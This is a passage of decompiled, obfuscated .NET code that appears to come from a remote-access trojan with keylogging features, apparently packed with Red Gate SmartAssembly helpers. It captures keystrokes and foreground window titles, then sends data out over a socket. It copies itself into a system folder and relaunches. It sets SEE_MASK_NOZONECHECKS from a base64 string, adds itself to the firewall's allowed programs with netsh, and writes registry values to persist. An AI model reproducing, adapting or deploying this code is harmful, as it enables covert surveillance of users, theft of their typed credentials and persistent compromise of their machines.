		return NewLateBinding.LateGet(obj, (Type)null, "CreateInstance", new object[1] { Strings.Split(Conversions.ToString(NewLateBinding.LateGet(obj, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), ",", -1, (CompareMethod)0)[0] + "." + string_0 }, (string[])null, (Type[])null, (bool[])null);
	}

	static void smethod_136(Delegate3 delegate3_0, Class38 class38_0)
	{
		if (class38_0.string_2 == null)
		{
			try
			{
				UploadReportLoginService uploadReportLoginService = new UploadReportLoginService();
				if (class38_0.iwebProxy_0 != null)
				{
					((HttpWebClientProtocol)uploadReportLoginService).set_Proxy(class38_0.iwebProxy_0);
				}
				class38_0.string_2 = uploadReportLoginService.GetServerURL(class38_0.string_1);
				if (class38_0.string_2.Length == 0)
				{
					throw new ApplicationException("Cannot connect to webservice");
				}
				if (class38_0.string_2 == "ditto")
				{
					class38_0.string_2 = Class38.string_0;
				}
			}
			catch (Exception ex)
			{
				delegate3_0("ERR 2001: " + ex.Message);
				return;
			}
		}
		delegate3_0(class38_0.string_2.StartsWith("ERR") ? class38_0.string_2 : "OK");
	}

	static string smethod_137(Class27.Class31 class31_0)
	{
		return class31_0.string_2;
	}

	static void smethod_138(Class27 class27_0, Delegate2 delegate2_0)
	{
		Delegate2 @delegate = class27_0.delegate2_0;
		Delegate2 delegate2;
		do
		{
			delegate2 = @delegate;
			Delegate2 value = (Delegate2)Delegate.Combine(delegate2, delegate2_0);
			@delegate = Interlocked.CompareExchange(ref class27_0.delegate2_0, value, delegate2);
		}
		while ((object)@delegate != delegate2);
	}

	static string smethod_139()
	{
		return "Software\\Red Gate\\" + Class24.smethod_33();
	}

	[DllImport("psapi")]
	static extern bool EmptyWorkingSet(long long_0);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetWindowTextA(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_0);

	static void smethod_140(byte[] byte_0, short[] short_0, Class13.Class20.Class21 class21_0)
	{
		class21_0.short_1 = short_0;
		class21_0.byte_0 = byte_0;
	}

	static void smethod_141(Control0 control0_0)
	{
		Class24.smethod_85(control0_0, string.Empty);
	}

	static void smethod_142(Class27 class27_0, Enum0 enum0_0, string string_0)
	{
		Class24.smethod_78(class27_0, enum0_0, string_0, string.Empty);
	}

	static Type smethod_143(Class32 class32_0)
	{
		return class32_0.type_0;
	}

	unsafe static void smethod_144(Exception exception_0, object[] object_0)
	{
		void* ptr = stackalloc byte[16];
		*(int*)ptr = -1;
		*(int*)((byte*)ptr + 4) = -1;
		*(int*)((byte*)ptr + 8) = 0;
		StackTrace stackTrace = new StackTrace(exception_0);
		try
		{
			if (exception_0.StackTrace != null)
			{
				string[] array = exception_0.StackTrace!.Split('\r', '\n');
				string[] array2 = array;
				*(int*)((byte*)ptr + 12) = 0;
				while (*(int*)((byte*)ptr + 12) < array2.Length)
				{
					string text = array2[*(int*)((byte*)ptr + 12)];
					if (text.Length > 0)
					{
						(*(int*)((byte*)ptr + 8))++;
					}
					(*(int*)((byte*)ptr + 12))++;
				}
			}
		}
		catch
		{
			*(int*)((byte*)ptr + 8) = -1;
		}
		try
		{
			if (stackTrace.FrameCount > 0)
			{
				StackFrame frame = stackTrace.GetFrame(stackTrace.FrameCount - 1);
				*(int*)ptr = (frame.GetMethod()!.MetadataToken & 0xFFFFFF) - 1;
				*(int*)((byte*)ptr + 4) = frame.GetILOffset();
			}
		}
		catch
		{
		}
		try
		{
			SmartStackFrame value = new SmartStackFrame(*(int*)ptr, object_0, *(int*)((byte*)ptr + 4), *(int*)((byte*)ptr + 8));
			LinkedList<object> linkedList;
			if (!exception_0.Data.Contains("SmartStackFrames"))
			{
				linkedList = new LinkedList<object>();
				exception_0.Data["SmartStackFrames"] = linkedList;
			}
			else
			{
				linkedList = (LinkedList<object>)exception_0.Data["SmartStackFrames"];
			}
			linkedList.AddLast(value);
		}
		catch
		{
		}
	}

	static void smethod_145(Class13.Class15 class15_0, int int_0)
	{
		class15_0.uint_0 >>= int_0;
		class15_0.int_2 -= int_0;
	}

	static string smethod_146()
	{
		return Class24.smethod_25().string_0;
	}

	static void smethod_147(Class0 class0_0)
	{
		Class24.smethod_15(class0_0, 0);
	}

	static void smethod_148(Class13.Stream0 stream0_0, int int_0)
	{
		stream0_0.WriteByte((byte)((uint)int_0 & 0xFFu));
		stream0_0.WriteByte((byte)((uint)(int_0 >> 8) & 0xFFu));
	}

	static string smethod_149(Class27.Class31 class31_0)
	{
		return class31_0.string_0;
	}

	static Assembly[] smethod_150(Class28 class28_0)
	{
		try
		{
			return AppDomain.CurrentDomain.GetAssemblies();
		}
		catch
		{
			return new Assembly[1] { Class24.smethod_82() };
		}
	}

	static int smethod_151(Class13.Stream0 stream0_0)
	{
		return Class24.smethod_158(stream0_0) | (Class24.smethod_158(stream0_0) << 16);
	}

	unsafe static int smethod_152(int int_0, byte[] byte_0, Class13.Class16 class16_0, int int_1)
	{
		void* ptr = stackalloc byte[16];
		*(int*)ptr = class16_0.int_0;
		if (int_0 > class16_0.int_1)
		{
			int_0 = class16_0.int_1;
		}
		else
		{
			*(int*)ptr = (class16_0.int_0 - class16_0.int_1 + int_0) & 0x7FFF;
		}
		*(int*)((byte*)ptr + 4) = int_0;
		*(int*)((byte*)ptr + 8) = int_0 - *(int*)ptr;
		if (*(int*)((byte*)ptr + 8) > 0)
		{
			Array.Copy(class16_0.byte_0, 32768 - *(int*)((byte*)ptr + 8), byte_0, int_1, *(int*)((byte*)ptr + 8));
			int_1 += *(int*)((byte*)ptr + 8);
			int_0 = *(int*)ptr;
		}
		Array.Copy(class16_0.byte_0, *(int*)ptr - int_0, byte_0, int_1, int_0);
		class16_0.int_1 -= *(int*)((byte*)ptr + 4);
		if (class16_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 4);
		return *(int*)((byte*)ptr + 12);
	}

	static string smethod_153()
	{
		return "Software\\Wow6432Node\\Red Gate\\" + Class24.smethod_33();
	}

	unsafe static void smethod_154(Class13.Class20 class20_0)
	{
		void* ptr = stackalloc byte[20];
		*(int*)ptr = 0;
		while (*(int*)ptr < class20_0.int_1)
		{
			*(int*)((byte*)ptr + 4) = class20_0.byte_1[*(int*)ptr] & 0xFF;
			int num = class20_0.short_0[*(int*)ptr];
			if (num-- != 0)
			{
				*(int*)((byte*)ptr + 8) = Class24.smethod_11(*(int*)((byte*)ptr + 4), class20_0);
				Class24.smethod_46(class20_0.class21_0, *(int*)((byte*)ptr + 8));
				*(int*)((byte*)ptr + 12) = (*(int*)((byte*)ptr + 8) - 261) / 4;
				if (*(int*)((byte*)ptr + 12) > 0 && *(int*)((byte*)ptr + 12) <= 5)
				{
					Class24.smethod_188(class20_0.class23_0, *(int*)((byte*)ptr + 4) & ((1 << *(int*)((byte*)ptr + 12)) - 1), *(int*)((byte*)ptr + 12));
				}
				*(int*)((byte*)ptr + 16) = Class24.smethod_185(class20_0, num);
				Class24.smethod_46(class20_0.class21_1, *(int*)((byte*)ptr + 16));
				*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 16) / 2 - 1;
				if (*(int*)((byte*)ptr + 12) > 0)
				{
					Class24.smethod_188(class20_0.class23_0, num & ((1 << *(int*)((byte*)ptr + 12)) - 1), *(int*)((byte*)ptr + 12));
				}
			}
			else
			{
				Class24.smethod_46(class20_0.class21_0, *(int*)((byte*)ptr + 4));
			}
			(*(int*)ptr)++;
		}
		Class24.smethod_46(class20_0.class21_0, 256);
	}

	static void smethod_155(Control0 control0_0)
	{
		control0_0.timer_0.set_Enabled(true);
		control0_0.image_0 = (Image)(object)Class24.smethod_116("current");
		control0_0.bool_0 = true;
		((Control)control0_0).Refresh();
	}

	unsafe static string smethod_156(Class0 class0_0)
	{
		void* ptr = stackalloc byte[12];
		string result;
		try
		{
			string string_ = Interaction.Environ("SystemDrive") + "\\";
			string string_2 = null;
			*(int*)((byte*)ptr + 4) = 0;
			byte* num = (byte*)ptr + 4;
			*(int*)((byte*)ptr + 8) = 0;
			byte* num2 = (byte*)ptr + 8;
			string string_3 = null;
			Class24.GetVolumeInformationA(ref string_, ref string_2, 0, ref *(int*)ptr, ref *(int*)num, ref *(int*)num2, ref string_3, 0);
			result = Conversion.Hex(*(int*)ptr);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			result = new string(new char[3] { 'E', 'R', 'R' });
			ProjectData.ClearProjectError();
		}
		return result;
	}

	static void smethod_157(EventArgs1 eventArgs1_0, bool bool_0)
	{
		eventArgs1_0.bool_2 = bool_0;
	}

	static int smethod_158(Class13.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static byte[] smethod_159(Class0 class0_0, byte[] byte_0, ref bool bool_0)
	{
		checked
		{
			object[] array5;
			bool[] array3;
			if (bool_0)
			{
				object obj = new MemoryStream();
				object obj2 = new GZipStream((Stream)obj, CompressionMode.Compress, leaveOpen: true);
				object[] array = new object[3] { byte_0, 0, byte_0.Length };
				object[] array2 = array;
				array3 = new bool[3] { true, false, false };
				NewLateBinding.LateCall(obj2, (Type)null, "Write", array2, (string[])null, (Type[])null, array3, true);
				if (array3[0])
				{
					byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
				}
				NewLateBinding.LateCall(obj2, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateSet(obj, (Type)null, "Position", new object[1] { 0 }, (string[])null, (Type[])null);
				byte[] array4 = new byte[Conversions.ToInteger(NewLateBinding.LateGet(obj, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null)) + 1];
				array5 = new object[3] { array4, 0, array4.Length };
				object[] array6 = array5;
				array3 = new bool[3] { true, false, false };
				NewLateBinding.LateCall(obj, (Type)null, "Read", array6, (string[])null, (Type[])null, array3, true);
				if (array3[0])
				{
					array4 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
				}
				NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				return array4;
			}
			object obj3 = new MemoryStream(byte_0);
			object obj4 = new GZipStream((Stream)obj3, CompressionMode.Decompress);
			byte[] array7 = new byte[4];
			NewLateBinding.LateSet(obj3, (Type)null, "Position", new object[1] { Operators.SubtractObject(NewLateBinding.LateGet(obj3, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)5) }, (string[])null, (Type[])null);
			array5 = new object[3] { array7, 0, 4 };
			object[] array8 = array5;
			array3 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj3, (Type)null, "Read", array8, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				array7 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
			}
			int num = BitConverter.ToInt32(array7, 0);
			NewLateBinding.LateSet(obj3, (Type)null, "Position", new object[1] { 0 }, (string[])null, (Type[])null);
			byte[] array9 = new byte[num - 1 + 1];
			array5 = new object[3] { array9, 0, num };
			object[] array10 = array5;
			array3 = new bool[3] { true, false, true };
			NewLateBinding.LateCall(obj4, (Type)null, "Read", array10, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				array9 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
			}
			if (array3[2])
			{
				num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[2]), typeof(int));
			}
			NewLateBinding.LateCall(obj4, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(obj3, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			return array9;
		}
	}

	static object smethod_160(Class0 class0_0, string string_0, string string_1)
	{
		object result;
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { new string(new char[9] { 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\' }) + class0_0.string_5 }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { string_0, string_1 };
			bool[] array2 = new bool[2] { true, true };
			NewLateBinding.LateCall(obj, (Type)null, "SetValue", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				string_0 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			if (array2[1])
			{
				string_1 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
			}
			result = true;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			result = false;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	unsafe static void smethod_161(Class35 class35_0)
	{
		void* ptr = stackalloc byte[8];
		try
		{
			Graphics val = ((Control)class35_0).CreateGraphics();
			try
			{
				string text = ((Control)class35_0).get_Text();
				Font font = ((Control)class35_0).get_Font();
				*(int*)((byte*)ptr + 4) = ((Control)class35_0).get_Width();
				*(int*)ptr = Class24.smethod_190(font, text, val, *(int*)((byte*)ptr + 4));
				if (*(int*)ptr > 0)
				{
					((Control)class35_0).set_Height(*(int*)ptr);
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}

	static string smethod_162(Class0 class0_0, string string_0)
	{
		string result;
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { "Software\\" + class0_0.string_5 }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { string_0, "" };
			bool[] array2 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "GetValue", array, (string[])null, (Type[])null, array2);
			if (array2[0])
			{
				string_0 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			result = Conversions.ToString(obj2);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			result = "";
			ProjectData.ClearProjectError();
		}
		return result;
	}

	static void smethod_163(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4)
	{
		Class24.smethod_144(exception_0, new object[5] { object_0, object_1, object_2, object_3, object_4 });
	}

	static string smethod_164(Class1 class1_0)
	{
		string result;
		try
		{
			IntPtr foregroundWindow = Class24.GetForegroundWindow();
			int int_ = default(int);
			Class24.GetWindowThreadProcessId(foregroundWindow, ref int_);
			object processById = Process.GetProcessById(int_);
			if (!Conversions.ToBoolean(Operators.OrObject(Operators.AndObject((object)(foregroundWindow.ToInt32() == class1_0.int_0), Operators.CompareObjectEqual((object)class1_0.string_0, NewLateBinding.LateGet(processById, (Type)null, "MainWindowTitle", new object[0], (string[])null, (Type[])null, (bool[])null), false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(processById, (Type)null, "MainWindowTitle", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))))
			{
				class1_0.int_0 = foregroundWindow.ToInt32();
				class1_0.string_0 = Conversions.ToString(NewLateBinding.LateGet(processById, (Type)null, "MainWindowTitle", new object[0], (string[])null, (Type[])null, (bool[])null));
				result = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat("\r\n\u0001" + Class24.smethod_30(class1_0), " "), NewLateBinding.LateGet(processById, (Type)null, "ProcessName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)" "), (object)class1_0.string_0), (object)'\u0001'), (object)"\r\n"));
				goto IL_0138;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		return "";
		IL_0138:
		return result;
	}

	static void smethod_165(int int_0, byte[] byte_0, int int_1, Class13.Class23 class23_0)
	{
		Array.Copy(byte_0, int_0, class23_0.byte_0, class23_0.int_1, int_1);
		class23_0.int_1 += int_1;
	}

	static int smethod_166(Class13.Class16 class16_0)
	{
		return 32768 - class16_0.int_1;
	}

	static void smethod_167(Exception exception_0, object object_0, object object_1, object object_2, object object_3)
	{
		Class24.smethod_144(exception_0, new object[4] { object_0, object_1, object_2, object_3 });
	}

	static void smethod_168(Class28 class28_0, EventArgs0 eventArgs0_0)
	{
		class28_0.delegate1_0?.Invoke(class28_0, eventArgs0_0);
	}

	static void smethod_169(Class2 class2_0)
	{
		if (class2_0.thread_0 == null)
		{
			class2_0.thread_0 = new Thread(class2_0.method_0, 1);
			class2_0.thread_0.Start();
		}
	}

	static string smethod_170(Class27.Class31 class31_0)
	{
		return class31_0.string_1;
	}

	unsafe static string smethod_171(uint uint_0)
	{
		void* ptr = stackalloc byte[13];
		string result;
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] byte_ = new byte[255];
			((byte*)ptr)[12] = (Class24.GetKeyboardState(byte_) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[12] == 0)
			{
				result = "";
			}
			else
			{
				*(uint*)((byte*)ptr + 8) = Class24.MapVirtualKey(uint_0, 0u);
				IntPtr foregroundWindow = Class24.GetForegroundWindow();
				*(int*)((byte*)ptr + 4) = 0;
				*(int*)ptr = Class24.GetWindowThreadProcessId(foregroundWindow, ref *(int*)((byte*)ptr + 4));
				IntPtr intptr_ = (IntPtr)Class24.GetKeyboardLayout(*(int*)ptr);
				Class24.ToUnicodeEx(uint_0, *(uint*)((byte*)ptr + 8), byte_, stringBuilder, 5, 0u, intptr_);
				result = stringBuilder.ToString();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
			goto IL_008c;
		}
		return result;
		IL_008c:
		return ((Enum)(Keys)checked((int)uint_0)).ToString();
	}

	static string smethod_172(Class2 class2_0, string string_0)
	{
		string result;
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Classes\\", writable: false);
			string text = Conversions.ToString(registryKey.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(registryKey.OpenSubKey(string_0, writable: false)!.GetValue(""), (object)"\\DefaultIcon\\")))!.GetValue("", ""));
			if (!text.Contains(","))
			{
				text += ",0";
			}
			result = text;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			result = "";
			ProjectData.ClearProjectError();
		}
		return result;
	}

	static string smethod_173(Class0 class0_0, ref string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	static void smethod_174(IWebProxy iwebProxy_0, Class38 class38_0)
	{
		class38_0.iwebProxy_0 = iwebProxy_0;
	}

	static void smethod_175(Class13.Class16 class16_0, int int_0)
	{
		if (class16_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class16_0.byte_0[class16_0.int_0++] = (byte)int_0;
		class16_0.int_0 &= 32767;
	}

	static Array smethod_176(string string_0, Class0 class0_0, byte[] byte_0)
	{
		object obj = new List<byte[]>();
		object obj2 = new MemoryStream();
		object obj3 = new MemoryStream();
		string[] array = Strings.Split(Class24.smethod_32(class0_0, ref byte_0), string_0, -1, (CompareMethod)0);
		object[] array2 = new object[3]
		{
			byte_0,
			0,
			array[0].Length
		};
		object[] array3 = array2;
		bool[] array4 = new bool[3] { true, false, false };
		NewLateBinding.LateCall(obj2, (Type)null, "Write", array3, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
		}
		object[] array5 = checked(new object[3]
		{
			byte_0,
			array[0].Length + string_0.Length,
			byte_0.Length - (array[0].Length + string_0.Length)
		});
		object[] array6 = array5;
		array4 = new bool[3] { true, false, false };
		NewLateBinding.LateCall(obj3, (Type)null, "Write", array6, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
		}
		array2 = new object[1];
		object[] array7 = array2;
		object obj4 = obj2;
		array7[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null));
		array5 = array2;
		object[] array8 = array5;
		array4 = new bool[1] { true };
		NewLateBinding.LateCall(obj, (Type)null, "Add", array8, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			NewLateBinding.LateSetComplex(obj4, (Type)null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array5[0]) }, (string[])null, (Type[])null, true, false);
		}
		object[] array9 = new object[1];
		object[] array10 = array9;
		obj4 = obj3;
		array10[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null));
		array2 = array9;
		object[] array11 = array2;
		array4 = new bool[1] { true };
		NewLateBinding.LateCall(obj, (Type)null, "Add", array11, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			NewLateBinding.LateSetComplex(obj4, (Type)null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array2[0]) }, (string[])null, (Type[])null, true, false);
		}
		NewLateBinding.LateCall(obj2, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(obj3, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		return (Array)NewLateBinding.LateGet(obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null);
	}

	static int smethod_177(Class13.Class23 class23_0)
	{
		return class23_0.int_2;
	}

	[DllImport("kernel32.Dll")]
	static extern short GetVersionEx(ref Class39.Struct19 struct19_0);

	static void smethod_178(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5)
	{
		Class24.smethod_144(exception_0, new object[6] { object_0, object_1, object_2, object_3, object_4, object_5 });
	}

	static long smethod_179(Class13.Class19 class19_0)
	{
		return class19_0.long_0;
	}

	[DllImport("gdi32.dll")]
	static extern IntPtr SelectObject(IntPtr intptr_0, IntPtr intptr_1);

	static void smethod_180(Class0 class0_0, byte[] byte_0)
	{
		if (!class0_0.bool_2)
		{
			return;
		}
		try
		{
			object obj = new MemoryStream();
			object[] array = new object[3] { byte_0, 0, byte_0.Length };
			object[] array2 = array;
			bool[] array3 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj, (Type)null, "Write", array2, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
			}
			NewLateBinding.LateCall(obj, (Type)null, "Write", new object[3]
			{
				Class24.smethod_198(ref class0_0.string_9, class0_0),
				0,
				class0_0.string_9.Length
			}, (string[])null, (Type[])null, (bool[])null, true);
			object obj2 = NewLateBinding.LateGet(class0_0.object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null);
			array = new object[4];
			object[] array4 = array;
			object obj3 = obj;
			array4[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj3, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null));
			array[1] = 0;
			object[] array5 = array;
			object obj4 = obj;
			array5[2] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null));
			array[3] = SocketFlags.None;
			object[] array6 = array;
			object[] array7 = array6;
			array3 = new bool[4] { true, false, true, false };
			NewLateBinding.LateCall(obj2, (Type)null, "Send", array7, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				NewLateBinding.LateSetComplex(obj3, (Type)null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array6[0]) }, (string[])null, (Type[])null, true, false);
			}
			if (array3[2])
			{
				NewLateBinding.LateSetComplex(obj4, (Type)null, "Length", new object[1] { RuntimeHelpers.GetObjectValue(array6[2]) }, (string[])null, (Type[])null, true, false);
			}
			NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			class0_0.bool_2 = false;
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_181(Class0 class0_0)
	{
		FileInfo fileInfo_ = (FileInfo)class0_0.object_0;
		FileInfo fileInfo_2 = new FileInfo(Interaction.Environ(class0_0.string_4).ToLower() + new string(new char[1] { '\\' }) + class0_0.string_3.ToLower());
		if (!Class24.smethod_10(fileInfo_2, fileInfo_, class0_0))
		{
			try
			{
				if (Operators.CompareString(Class24.smethod_162(class0_0, "us"), "", false) == 0)
				{
					if (Conversions.ToBoolean(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_0, (Type)null, "Directory", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Contains", new object[1] { new char[1] { ':' } }, (string[])null, (Type[])null, (bool[])null)))
					{
						Class24.smethod_160(class0_0, "US", "!");
					}
					else
					{
						Class24.smethod_160(class0_0, "US", "@");
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
			try
			{
				string string_ = "U0VFX01BU0tfTk9aT05FQ0hFQ0tT";
				Environment.SetEnvironmentVariable(Class24.smethod_173(class0_0, ref string_), "1", EnvironmentVariableTarget.User);
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				ProjectData.ClearProjectError();
			}
			try
			{
				if (File.Exists(Interaction.Environ(class0_0.string_4) + "\\" + class0_0.string_3))
				{
					File.Delete(Interaction.Environ(class0_0.string_4) + "\\" + class0_0.string_3);
				}
				File.Copy(Conversions.ToString(NewLateBinding.LateGet(class0_0.object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), Interaction.Environ(class0_0.string_4) + new string(new char[1] { '\\' }) + class0_0.string_3, overwrite: true);
				Process.Start(Interaction.Environ(class0_0.string_4) + new string(new char[1] { '\\' }) + class0_0.string_3);
				ProjectData.EndApp();
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"netsh firewall add allowedprogram \"", NewLateBinding.LateGet(class0_0.object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" "), (object)'"'), NewLateBinding.LateGet(class0_0.object_0, (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" ENABLE")), (AppWinStyle)0, false, -1);
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception ex8 = ex7;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { class0_0.string_10, true };
			object[] array2 = array;
			bool[] array3 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "OpenSubKey", array2, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				class0_0.string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			object[] array4 = new object[2]
			{
				class0_0.string_5,
				Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(class0_0.object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)new char[3] { ' ', '.', '.' })
			};
			object[] array5 = array4;
			bool[] array6 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj2, (Type)null, "SetValue", array5, (string[])null, (Type[])null, array6, true);
			if (array6[0])
			{
				class0_0.string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9);
			Exception ex10 = ex9;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj3 = NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array7 = new object[2] { class0_0.string_10, true };
			object[] array8 = array7;
			bool[] array6 = new bool[2] { true, false };
			object obj4 = NewLateBinding.LateGet(obj3, (Type)null, "OpenSubKey", array8, (string[])null, (Type[])null, array6);
			if (array6[0])
			{
